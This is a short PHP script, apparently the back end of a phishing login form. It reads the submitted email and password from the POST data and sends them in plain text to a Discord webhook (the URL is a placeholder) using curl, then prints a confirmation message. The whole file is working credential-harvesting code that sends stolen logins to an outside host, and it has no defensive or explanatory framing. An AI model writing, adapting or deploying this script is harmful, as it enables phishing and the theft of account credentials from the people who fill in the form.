<?php
// Get form data
$email = $_POST['email'];
$password = $_POST['password'];

// Set Discord webhook URL
$webhook_url = 'https://discord.com/api/webhooks/WEBHOOK-URL-HERE';

// Set message data
$data = [
    'content' => "Email: $email\nPassword: $password"
];

// Send message to Discord webhook
$ch = curl_init($webhook_url);
curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_exec($ch);
curl_close($ch);

echo 'Message sent to Discord webhook.';
?>
